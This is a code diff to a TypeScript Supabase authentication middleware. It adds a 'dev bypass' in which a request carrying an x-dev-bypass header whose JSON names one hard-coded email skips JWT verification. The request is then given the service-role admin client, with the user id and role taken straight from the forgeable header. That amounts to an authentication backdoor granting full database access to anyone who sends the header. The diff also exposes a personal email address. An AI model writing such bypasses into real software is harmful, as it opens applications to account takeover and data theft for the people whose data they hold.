@@ -24,6 +24,26 @@ export const requireSupabaseAuth = createMiddleware({ type: "function" }).server
       throw new Error("Unauthorized: No request headers available");
     }
 
+    // Dev bypass — skip JWT verification for the configured admin email
+    const devBypass = request.headers.get("x-dev-bypass");
+    if (devBypass) {
+      try {
+        const parsed = JSON.parse(devBypass);
+        if (parsed?.user?.email === "emaildonovin@gmail.com") {
+          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+          return next({
+            context: {
+              supabase: supabaseAdmin,
+              userId: parsed.user.id,
+              claims: { sub: parsed.user.id, email: parsed.user.email, role: parsed.user.role },
+            },
+          });
+        }
+      } catch {
+        // Invalid bypass payload — fall through to normal auth
+      }
+    }
+
     const authHeader = request.headers.get("authorization");
 
     if (!authHeader) {
